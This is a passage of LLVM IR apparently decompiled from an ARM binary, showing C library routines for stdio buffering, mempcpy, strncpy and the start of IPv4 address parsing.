  store i32 %v1_104c0, i32* %r6.global-to-local, align 4
  %v3_104c4 = inttoptr i32 %v2_104c4 to i8*
  store i8 %v2_104b8, i8* %v3_104c4, align 1
  %v0_104c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_104c8, label %dec_label_pc_104cc, label %dec_label_pc_104d8

dec_label_pc_104cc:                               ; preds = %bb24
  %v0_104cc = load i32, i32* %r4.global-to-local, align 4
  %v1_104cc = inttoptr i32 %v0_104cc to i16*
  %v2_104cc = load i16, i16* %v1_104cc, align 2
  %v3_104cc = zext i16 %v2_104cc to i32
  store i32 %v3_104cc, i32* %r3.global-to-local, align 4
  %v1_104d0 = and i32 %v3_104cc, 256
  %v2_104d0 = icmp eq i32 %v1_104d0, 0
  store i1 %v2_104d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_104d0, label %dec_label_pc_104d8, label %dec_label_pc_104cc.dec_label_pc_104e4_crit_edge

dec_label_pc_104cc.dec_label_pc_104e4_crit_edge:  ; preds = %dec_label_pc_104cc
  %v0_104e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_104e4

dec_label_pc_104d8:                               ; preds = %dec_label_pc_104cc, %bb24
  %v0_104d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_104d8 = add i32 %v0_104d8, -1
  store i32 %v1_104d8, i32* %r2.global-to-local, align 4
  %v7_104d8 = icmp eq i32 %v0_104d8, 1
  store i1 %v7_104d8, i1* %cpsr_z.global-to-local, align 1
  %v0_104dc = load i32, i32* %r1.global-to-local, align 4
  %v1_104dc = add i32 %v0_104dc, 1
  store i32 %v1_104dc, i32* %r1.global-to-local, align 4
  br i1 %v7_104d8, label %dec_label_pc_104d8.dec_label_pc_104e4_crit_edge, label %bb24

dec_label_pc_104d8.dec_label_pc_104e4_crit_edge:  ; preds = %dec_label_pc_104d8
  %v0_104e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_104e4

dec_label_pc_104e4:                               ; preds = %dec_label_pc_104cc.dec_label_pc_104e4_crit_edge, %dec_label_pc_104d8.dec_label_pc_104e4_crit_edge
  %v0_104e8 = phi i32 [ %v1_104dc, %dec_label_pc_104d8.dec_label_pc_104e4_crit_edge ], [ %v0_104e8.pre, %dec_label_pc_104cc.dec_label_pc_104e4_crit_edge ]
  %v0_104e4 = phi i32 [ %v0_104e4.pre, %dec_label_pc_104d8.dec_label_pc_104e4_crit_edge ], [ %v0_104cc, %dec_label_pc_104cc.dec_label_pc_104e4_crit_edge ]
  %v1_104e4 = add i32 %v0_104e4, 8
  %v2_104e4 = inttoptr i32 %v1_104e4 to i32*
  %v3_104e4 = load i32, i32* %v2_104e4, align 4
  store i32 %v3_104e4, i32* %r3.global-to-local, align 4
  %v2_104e8 = add i32 %v0_104e4, 16
  %v3_104e8 = inttoptr i32 %v2_104e8 to i32*
  store i32 %v0_104e8, i32* %v3_104e8, align 4
  %v0_104ec = load i32, i32* %r3.global-to-local, align 4
  %v1_104ec = load i32, i32* %r1.global-to-local, align 4
  %v2_104ec = sub i32 %v1_104ec, %v0_104ec
  store i32 %v2_104ec, i32* %r3.global-to-local, align 4
  %v1_104f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_104f0 = sub i32 %v1_104f0, %v2_104ec
  store i32 %v2_104f0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_104f4

dec_label_pc_104f4:                               ; preds = %dec_label_pc_10494.dec_label_pc_104f4_crit_edge, %dec_label_pc_104e4
  %v0_104f4 = phi i32 [ %v0_104f4.pre, %dec_label_pc_10494.dec_label_pc_104f4_crit_edge ], [ %v2_104f0, %dec_label_pc_104e4 ]
  %v1_104f4 = load i32, i32* @r7, align 4
  %v2_104f4 = sub i32 %v1_104f4, %v0_104f4
  br label %dec_label_pc_104f8

dec_label_pc_10468.dec_label_pc_104f8.loopexit_crit_edge: ; preds = %dec_label_pc_10468thread-pre-split
  %v0_104f8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_104f8

dec_label_pc_104f8:                               ; preds = %entry, %dec_label_pc_10468.dec_label_pc_104f8.loopexit_crit_edge, %dec_label_pc_104f4
  %v0_104f8 = phi i32 [ %v2_104f4, %dec_label_pc_104f4 ], [ %v0_104f8.pre.pre, %dec_label_pc_10468.dec_label_pc_104f8.loopexit_crit_edge ], [ 0, %entry ]
  %v2_104fc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_104fc, i32* %r4.global-to-local, align 4
  ret i32 %v0_104f8

; uselistorder directives
  uselistorder i32 %v0_104e4, { 1, 0 }
  uselistorder i32 %v1_104dc, { 0, 2, 1 }
  uselistorder i32 %v0_104d8, { 1, 0 }
  uselistorder i32 %v1_104b0, { 0, 2, 1 }
  uselistorder i32 %v0_104b0, { 1, 0 }
  uselistorder i32 %v5_1049c, { 1, 0 }
  uselistorder i32 %v2_1049c, { 1, 0, 2 }
  uselistorder i32 %v3_10480, { 2, 3, 0, 1 }
  uselistorder i32 %v0_10478, { 1, 0 }
  uselistorder i32 %v5_1048c, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 5, 1, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 1, 4, 2, 5, 6, 7, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @__GI_write, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_104f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_104f4, { 1, 0 }
  uselistorder label %dec_label_pc_104e4, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10470, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10504 = load i32, i32* @r4, align 4
  store i32 %v3_10504, i32* %stack_var_-8, align 4
  %v1_10508 = add i32 %arg1, 8
  %v1_1050c = inttoptr i32 %v1_10508 to i32*
  %v2_1050c = load i32, i32* %v1_1050c, align 4
  %v3_1050c = add i32 %arg1, 12
  %v4_1050c = inttoptr i32 %v3_1050c to i32*
  %v5_1050c = load i32, i32* %v4_1050c, align 4
  %v2_10510 = sub i32 %v5_1050c, %v2_1050c
  store i32 %v2_10510, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_10518 = inttoptr i32 %arg1 to i16*
  %v4_10518 = call i32 @__stdio_READ(i16* %v3_10518, i32 %v2_1050c, i32 %v2_10510)
  %v0_1051c = load i32, i32* @r4, align 4
  %v1_1051c = add i32 %v0_1051c, 8
  %v2_1051c = inttoptr i32 %v1_1051c to i32*
  %v3_1051c = load i32, i32* %v2_1051c, align 4
  store i32 %v3_1051c, i32* %r2.global-to-local, align 4
  %v2_10520 = add i32 %v3_1051c, %v4_10518
  %v2_10524 = add i32 %v0_1051c, 20
  %v3_10524 = inttoptr i32 %v2_10524 to i32*
  store i32 %v2_10520, i32* %v3_10524, align 4
  %v0_10528 = load i32, i32* %r2.global-to-local, align 4
  %v1_10528 = load i32, i32* @r4, align 4
  %v2_10528 = add i32 %v1_10528, 16
  %v3_10528 = inttoptr i32 %v2_10528 to i32*
  store i32 %v0_10528, i32* %v3_10528, align 4
  %v2_1052c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1052c, i32* @r4, align 4
  ret i32 %v4_10518

; uselistorder directives
  uselistorder i32 %v4_10518, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10534 = load i32, i32* @r4, align 4
  store i32 %v3_10534, i32* %stack_var_-12, align 4
  %v0_10538 = load i32, i32* @r0, align 4
  %v1_10538 = inttoptr i32 %v0_10538 to i16*
  %v2_10538 = load i16, i16* %v1_10538, align 2
  %v3_10538 = zext i16 %v2_10538 to i32
  store i32 %v3_10538, i32* %r3.global-to-local, align 4
  %v0_1053c = load i32, i32* @r1, align 4
  %v2_1053c = and i32 %v0_1053c, %v3_10538
  %v4_1053c = icmp eq i32 %v2_1053c, 0
  store i32 %v0_10538, i32* @r4, align 4
  br i1 %v4_1053c, label %dec_label_pc_1054c, label %dec_label_pc_1055c

dec_label_pc_1054c:                               ; preds = %entry
  %v1_1054c = and i32 %v3_10538, 2176
  %v2_1054c = icmp eq i32 %v1_1054c, 0
  br i1 %v2_1054c, label %dec_label_pc_10554, label %dec_label_pc_10568

dec_label_pc_10554:                               ; preds = %dec_label_pc_1054c
  %v2_10554 = or i32 %v0_1053c, %v3_10538
  store i32 %v2_10554, i32* %r3.global-to-local, align 4
  %v1_10558 = trunc i32 %v2_10554 to i16
  store i16 %v1_10558, i16* %v1_10538, align 2
  %v0_1055c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1055c

dec_label_pc_1055c:                               ; preds = %entry, %dec_label_pc_10554
  %v0_1055c = phi i32 [ %v0_10538, %entry ], [ %v0_1055c.pre, %dec_label_pc_10554 ]
  %v1_1055c = inttoptr i32 %v0_1055c to i16*
  %v2_1055c = load i16, i16* %v1_1055c, align 2
  %v3_1055c = zext i16 %v2_1055c to i32
  store i32 %v3_1055c, i32* %r3.global-to-local, align 4
  %v1_10560 = and i32 %v3_1055c, 16
  store i32 %v1_10560, i32* %r5.global-to-local, align 4
  %v2_10560 = icmp eq i32 %v1_10560, 0
  br i1 %v2_10560, label %dec_label_pc_10588, label %dec_label_pc_10568

dec_label_pc_10568:                               ; preds = %dec_label_pc_1054c, %dec_label_pc_1055c
  %v0_10568 = call i32 @__GI___errno_location()
  store i32 %v0_10568, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_10570 = inttoptr i32 %v0_10568 to i32*
  store i32 9, i32* %v2_10570, align 4
  br label %dec_label_pc_10574

dec_label_pc_10574:                               ; preds = %dec_label_pc_10590, %dec_label_pc_10568
  %v0_10574 = load i32, i32* @r4, align 4
  %v1_10574 = inttoptr i32 %v0_10574 to i16*
  %v2_10574 = load i16, i16* %v1_10574, align 2
  %v3_10574 = zext i16 %v2_10574 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1057c = or i32 %v3_10574, 8
  store i32 %v1_1057c, i32* %r3.global-to-local, align 4
  %v1_10580 = trunc i32 %v1_1057c to i16
  store i16 %v1_10580, i16* %v1_10574, align 2
  %v1_105c8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_105c0

dec_label_pc_10588:                               ; preds = %dec_label_pc_1055c
  %v1_10588 = and i32 %v3_1055c, 64
  %v2_10588 = icmp eq i32 %v1_10588, 0
  br i1 %v2_10588, label %dec_label_pc_105b0, label %dec_label_pc_10590

dec_label_pc_10590:                               ; preds = %dec_label_pc_10588
  %v0_10590 = call i32 @__stdio_wcommit()
  store i32 %v0_10590, i32* %r0.global-to-local, align 4
  %v2_10594 = icmp eq i32 %v0_10590, 0
  br i1 %v2_10594, label %dec_label_pc_1059c, label %dec_label_pc_10574

dec_label_pc_1059c:                               ; preds = %dec_label_pc_10590
  %v0_1059c = load i32, i32* @r4, align 4
  %v1_1059c = inttoptr i32 %v0_1059c to i16*
  %v2_1059c = load i16, i16* %v1_1059c, align 2
  %v3_1059c = zext i16 %v2_1059c to i32
  store i32 %v3_1059c, i32* %r3.global-to-local, align 4
  %v1_105a0 = add i32 %v0_1059c, 8
  %v2_105a0 = inttoptr i32 %v1_105a0 to i32*
  %v3_105a0 = load i32, i32* %v2_105a0, align 4
  %v1_105a4 = and i32 %v3_1059c, 65471
  store i32 %v1_105a4, i32* %r3.global-to-local, align 4
  %v2_105a8 = add i32 %v0_1059c, 28
  %v3_105a8 = inttoptr i32 %v2_105a8 to i32*
  store i32 %v3_105a0, i32* %v3_105a8, align 4
  %v0_105ac = load i32, i32* %r3.global-to-local, align 4
  %v1_105ac = trunc i32 %v0_105ac to i16
  %v2_105ac = load i32, i32* @r4, align 4
  %v3_105ac = inttoptr i32 %v2_105ac to i16*
  store i16 %v1_105ac, i16* %v3_105ac, align 2
  %v0_105b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_105b0

dec_label_pc_105b0:                               ; preds = %dec_label_pc_10588, %dec_label_pc_1059c
  %v2_105b8 = phi i32 [ %v0_1055c, %dec_label_pc_10588 ], [ %v0_105b0.pre, %dec_label_pc_1059c ]
  %v1_105b0 = inttoptr i32 %v2_105b8 to i16*
  %v2_105b0 = load i16, i16* %v1_105b0, align 2
  %v3_105b0 = zext i16 %v2_105b0 to i32
  %v1_105b4 = or i32 %v3_105b0, 1
  store i32 %v1_105b4, i32* %r3.global-to-local, align 4
  %v1_105b8 = trunc i32 %v1_105b4 to i16
  store i16 %v1_105b8, i16* %v1_105b0, align 2
  %v0_105bc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_105bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_105c0

dec_label_pc_105c0:                               ; preds = %dec_label_pc_10574, %dec_label_pc_105b0
  %v1_105c8 = phi i32 [ %v1_105c8.pre, %dec_label_pc_10574 ], [ %v0_105bc, %dec_label_pc_105b0 ]
  %v2_105c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_105c4, i32* @r4, align 4
  ret i32 %v1_105c8

; uselistorder directives
  uselistorder i32 %v3_10538, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder label %dec_label_pc_105c0, { 1, 0 }
  uselistorder label %dec_label_pc_105b0, { 1, 0 }
  uselistorder label %dec_label_pc_10568, { 1, 0 }
  uselistorder label %dec_label_pc_1055c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_105cc = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_105dc = call i32 @memcpy()
  %v0_105e0 = load i32, i32* @r5, align 4
  %v1_105e0 = load i32, i32* @r4, align 4
  %v2_105e0 = add i32 %v1_105e0, %v0_105e0
  store i32 %v6_105cc, i32* @r5, align 4
  ret i32 %v2_105e0
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_105f0 = icmp eq i32 %arg2, 3
  store i1 %v7_105f0, i1* %cpsr_z.global-to-local, align 1
  %v0_105f4 = load i32, i32* @lr, align 4
  store i32 %v0_105f4, i32* %stack_var_-4, align 4
  %v1_105f8 = add i32 %arg1, -1
  store i32 %v1_105f8, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_10674, label %dec_label_pc_10600

dec_label_pc_10600:                               ; preds = %entry
  %v3_10600 = udiv i32 %arg2, 4
  store i32 %v3_10600, i32* %lr.global-to-local, align 4
  %v0_10604.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_10604

dec_label_pc_10604:                               ; preds = %dec_label_pc_10650, %dec_label_pc_10600
  %v2_1060c = phi i32 [ %v6_10644, %dec_label_pc_10650 ], [ %v1_105f8, %dec_label_pc_10600 ]
  %v0_10604 = phi i32 [ %v1_10654, %dec_label_pc_10650 ], [ %v0_10604.pre, %dec_label_pc_10600 ]
  %v1_10604 = inttoptr i32 %v0_10604 to i8*
  %v2_10604 = load i8, i8* %v1_10604, align 1
  %v3_10604 = zext i8 %v2_10604 to i32
  store i32 %v3_10604, i32* %r3.global-to-local, align 4
  %v2_10608 = icmp eq i8 %v2_10604, 0
  store i1 %v2_10608, i1* %cpsr_z.global-to-local, align 1
  %v3_1060c = add i32 %v2_1060c, 1
  %v4_1060c = inttoptr i32 %v3_1060c to i8*
  store i8 %v2_10604, i8* %v4_1060c, align 1
  %v5_1060c = load i32, i32* @ip, align 4
  %v6_1060c = add i32 %v5_1060c, 1
  store i32 %v6_1060c, i32* @ip, align 4
  %v0_10610 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10610, label %dec_label_pc_10660, label %dec_label_pc_10614

dec_label_pc_10614:                               ; preds = %dec_label_pc_10604
  %v0_10614 = load i32, i32* @r1, align 4
  %v1_10614 = add i32 %v0_10614, 1
  %v2_10614 = inttoptr i32 %v1_10614 to i8*
  %v3_10614 = load i8, i8* %v2_10614, align 1
  %v4_10614 = zext i8 %v3_10614 to i32
  store i32 %v4_10614, i32* %r3.global-to-local, align 4
  %v2_10618 = icmp eq i8 %v3_10614, 0
  store i1 %v2_10618, i1* %cpsr_z.global-to-local, align 1
  %v3_1061c = add i32 %v5_1060c, 2
  %v4_1061c = inttoptr i32 %v3_1061c to i8*
  store i8 %v3_10614, i8* %v4_1061c, align 1
  %v5_1061c = load i32, i32* @ip, align 4
  %v6_1061c = add i32 %v5_1061c, 1
  store i32 %v6_1061c, i32* @ip, align 4
  %v0_10620 = load i32, i32* @r1, align 4
  %v1_10620 = add i32 %v0_10620, 1
  store i32 %v1_10620, i32* %r1.global-to-local, align 4
  %v0_10624 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10624, label %dec_label_pc_10660, label %dec_label_pc_10628

dec_label_pc_10628:                               ; preds = %dec_label_pc_10614
  %v1_10628 = add i32 %v0_10620, 2
  %v2_10628 = inttoptr i32 %v1_10628 to i8*
  %v3_10628 = load i8, i8* %v2_10628, align 1
  %v4_10628 = zext i8 %v3_10628 to i32
  store i32 %v4_10628, i32* %r3.global-to-local, align 4
  %v2_1062c = icmp eq i8 %v3_10628, 0
  store i1 %v2_1062c, i1* %cpsr_z.global-to-local, align 1
  %v3_10630 = add i32 %v5_1061c, 2
  %v4_10630 = inttoptr i32 %v3_10630 to i8*
  store i8 %v3_10628, i8* %v4_10630, align 1
  %v5_10630 = load i32, i32* @ip, align 4
  %v6_10630 = add i32 %v5_10630, 1
  store i32 %v6_10630, i32* @ip, align 4
  %v0_10634 = load i32, i32* %r1.global-to-local, align 4
  %v1_10634 = add i32 %v0_10634, 1
  store i32 %v1_10634, i32* %r1.global-to-local, align 4
  %v0_10638 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10638, label %dec_label_pc_10660, label %dec_label_pc_1063c

dec_label_pc_1063c:                               ; preds = %dec_label_pc_10628
  %v1_1063c = add i32 %v0_10634, 2
  %v2_1063c = inttoptr i32 %v1_1063c to i8*
  %v3_1063c = load i8, i8* %v2_1063c, align 1
  %v4_1063c = zext i8 %v3_1063c to i32
  store i32 %v4_1063c, i32* %r3.global-to-local, align 4
  %v2_10640 = icmp eq i8 %v3_1063c, 0
  store i1 %v2_10640, i1* %cpsr_z.global-to-local, align 1
  %v3_10644 = add i32 %v5_10630, 2
  %v4_10644 = inttoptr i32 %v3_10644 to i8*
  store i8 %v3_1063c, i8* %v4_10644, align 1
  %v5_10644 = load i32, i32* @ip, align 4
  %v6_10644 = add i32 %v5_10644, 1
  store i32 %v6_10644, i32* @ip, align 4
  %v0_10648 = load i32, i32* %r1.global-to-local, align 4
  %v1_10648 = add i32 %v0_10648, 1
  store i32 %v1_10648, i32* %r1.global-to-local, align 4
  %v0_1064c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1064c, label %dec_label_pc_10660, label %dec_label_pc_10650

dec_label_pc_10650:                               ; preds = %dec_label_pc_1063c
  %v0_10650 = load i32, i32* %lr.global-to-local, align 4
  %v1_10650 = add i32 %v0_10650, -1
  store i32 %v1_10650, i32* %lr.global-to-local, align 4
  %v7_10650 = icmp eq i32 %v0_10650, 1
  store i1 %v7_10650, i1* %cpsr_z.global-to-local, align 1
  %v1_10654 = add i32 %v0_10648, 2
  store i32 %v1_10654, i32* @r1, align 4
  br i1 %v7_10650, label %dec_label_pc_10674, label %dec_label_pc_10604

dec_label_pc_10660:                               ; preds = %dec_label_pc_1063c, %dec_label_pc_10628, %dec_label_pc_10614, %dec_label_pc_10604
  %v1_10660 = phi i32 [ %v6_10644, %dec_label_pc_1063c ], [ %v6_10630, %dec_label_pc_10628 ], [ %v6_1061c, %dec_label_pc_10614 ], [ %v6_1060c, %dec_label_pc_10604 ]
  %v2_106601 = sub i32 %arg1, %v1_10660
  %v2_10664 = add i32 %v2_106601, %arg2
  %v1_10668 = add i32 %v2_10664, -1
  store i32 %v1_10668, i32* %r3.global-to-local, align 4
  %v7_10668 = icmp eq i32 %v2_10664, 1
  store i1 %v7_10668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10668, label %dec_label_pc_106a4, label %dec_label_pc_10694

dec_label_pc_10674:                               ; preds = %dec_label_pc_10650, %entry
  %v2_106847 = phi i32 [ %v1_105f8, %entry ], [ %v6_10644, %dec_label_pc_10650 ]
  %v1_10674 = urem i32 %arg2, 4
  store i32 %v1_10674, i32* %r3.global-to-local, align 4
  %v2_10674 = icmp eq i32 %v1_10674, 0
  store i1 %v2_10674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10674, label %dec_label_pc_106a4, label %dec_label_pc_1067c

dec_label_pc_1067c:                               ; preds = %dec_label_pc_10674, %dec_label_pc_1068c.dec_label_pc_1067c_crit_edge
  %v2_10684 = phi i32 [ %v6_10684, %dec_label_pc_1068c.dec_label_pc_1067c_crit_edge ], [ %v2_106847, %dec_label_pc_10674 ]
  %v0_10680 = phi i32 [ %v0_10680.pre, %dec_label_pc_1068c.dec_label_pc_1067c_crit_edge ], [ %v1_10674, %dec_label_pc_10674 ]
  %v0_1067c = load i32, i32* @r1, align 4
  %v1_1067c = inttoptr i32 %v0_1067c to i8*
  %v2_1067c = load i8, i8* %v1_1067c, align 1
  %v3_1067c = zext i8 %v2_1067c to i32
  store i32 %v3_1067c, i32* %r2.global-to-local, align 4
  %v5_1067c = add i32 %v0_1067c, 1
  store i32 %v5_1067c, i32* @r1, align 4
  %v1_10680 = add i32 %v0_10680, -1
  store i32 %v1_10680, i32* %r3.global-to-local, align 4
  %v7_10680 = icmp eq i32 %v0_10680, 1
  store i1 %v7_10680, i1* %cpsr_z.global-to-local, align 1
  %v3_10684 = add i32 %v2_10684, 1
  %v4_10684 = inttoptr i32 %v3_10684 to i8*
  store i8 %v2_1067c, i8* %v4_10684, align 1
  %v5_10684 = load i32, i32* @ip, align 4
  %v6_10684 = add i32 %v5_10684, 1
  store i32 %v6_10684, i32* @ip, align 4
  %v0_10688 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10688, label %dec_label_pc_106a4, label %dec_label_pc_1068c

dec_label_pc_1068c:                               ; preds = %dec_label_pc_1067c
  %v0_1068c = load i32, i32* %r2.global-to-local, align 4
  %v2_1068c = icmp eq i32 %v0_1068c, 0
  store i1 %v2_1068c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1068c, label %dec_label_pc_10694, label %dec_label_pc_1068c.dec_label_pc_1067c_crit_edge

dec_label_pc_1068c.dec_label_pc_1067c_crit_edge:  ; preds = %dec_label_pc_1068c
  %v0_10680.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1067c

dec_label_pc_10694:                               ; preds = %dec_label_pc_1068c, %dec_label_pc_10660
  %v2_1069c10 = phi i32 [ %v1_10660, %dec_label_pc_10660 ], [ %v6_10684, %dec_label_pc_1068c ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10698

dec_label_pc_10698:                               ; preds = %dec_label_pc_10698.dec_label_pc_10698_crit_edge, %dec_label_pc_10694
  %v2_1069c = phi i32 [ %v6_1069c, %dec_label_pc_10698.dec_label_pc_10698_crit_edge ], [ %v2_1069c10, %dec_label_pc_10694 ]
  %v0_1069c.off0 = phi i8 [ %extract.t, %dec_label_pc_10698.dec_label_pc_10698_crit_edge ], [ 0, %dec_label_pc_10694 ]
  %v0_10698 = load i32, i32* %r3.global-to-local, align 4
  %v1_10698 = add i32 %v0_10698, -1
  store i32 %v1_10698, i32* %r3.global-to-local, align 4
  %v7_10698 = icmp eq i32 %v0_10698, 1
  store i1 %v7_10698, i1* %cpsr_z.global-to-local, align 1
  %v3_1069c = add i32 %v2_1069c, 1
  %v4_1069c = inttoptr i32 %v3_1069c to i8*
  store i8 %v0_1069c.off0, i8* %v4_1069c, align 1
  %v5_1069c = load i32, i32* @ip, align 4
  %v6_1069c = add i32 %v5_1069c, 1
  store i32 %v6_1069c, i32* @ip, align 4
  %v0_106a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_106a0, label %dec_label_pc_106a4, label %dec_label_pc_10698.dec_label_pc_10698_crit_edge

dec_label_pc_10698.dec_label_pc_10698_crit_edge:  ; preds = %dec_label_pc_10698
  %v0_1069c.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_1069c.pre to i8
  br label %dec_label_pc_10698

dec_label_pc_106a4:                               ; preds = %dec_label_pc_1067c, %dec_label_pc_10698, %dec_label_pc_10660, %dec_label_pc_10674
  %v2_106a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_106a4, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_1069c, { 1, 0 }
  uselistorder i32 %v0_10698, { 1, 0 }
  uselistorder i32 %v6_10684, { 0, 2, 1 }
  uselistorder i32 %v1_10674, { 2, 1, 0 }
  uselistorder i32 %v2_10664, { 1, 0 }
  uselistorder i32 %v1_10654, { 1, 0 }
  uselistorder i32 %v0_10650, { 1, 0 }
  uselistorder i32 %v6_10644, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_106a4, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1067c, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_106ac = load i32, i32* @r4, align 4
  %v6_106ac = load i32, i32* @r5, align 4
  %v15_106ac = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_106c4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_106c4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_1073c1 = load i32, i32* @r0, align 4
  %v1_1073c2 = inttoptr i32 %v0_1073c1 to i8*
  %v2_1073c3 = load i8, i8* %v1_1073c2, align 1
  %v3_1073c4 = zext i8 %v2_1073c3 to i32
  store i32 %v3_1073c4, i32* @r3, align 4
  %v2_107405 = icmp eq i8 %v2_1073c3, 0
  store i1 %v2_107405, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_107405, label %dec_label_pc_1074c, label %dec_label_pc_106dc

dec_label_pc_106dc:                               ; preds = %entry, %dec_label_pc_1073c.backedge
  %v0_106e0 = phi i32 [ %v0_1073c, %dec_label_pc_1073c.backedge ], [ %v0_1073c1, %entry ]
  %v0_10718 = phi i32 [ %v3_1073c, %dec_label_pc_1073c.backedge ], [ %v3_1073c4, %entry ]
  %v2_106ec.in = phi i32 [ %v3_1073c, %dec_label_pc_1073c.backedge ], [ %v3_1073c4, %entry ]
  %v2_106ec = add nsw i32 %v2_106ec.in, -48
  %v2_106dc = icmp ugt i32 %v2_106ec, 8
  %v7_106dc = icmp eq i32 %v2_106ec, 9
  store i1 %v7_106dc, i1* %cpsr_z.global-to-local, align 1
  %v1_106e0 = add i32 %v0_106e0, 1
  store i32 %v1_106e0, i32* %r0.global-to-local, align 4
  %v2_106e4 = xor i1 %v7_106dc, true
  %v3_106e4 = and i1 %v2_106dc, %v2_106e4
  br i1 %v3_106e4, label %dec_label_pc_10718, label %dec_label_pc_106e8

dec_label_pc_106e8:                               ; preds = %dec_label_pc_106dc
  %v0_106e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_106e8 = inttoptr i32 %v0_106e8 to i8*
  %v2_106e8 = load i8, i8* %v1_106e8, align 1
  %v3_106e8 = zext i8 %v2_106e8 to i32
  %v0_106ec = load i32, i32* %r7.global-to-local, align 4
  %v3_106ec = mul i32 %v0_106ec, %v3_106e8
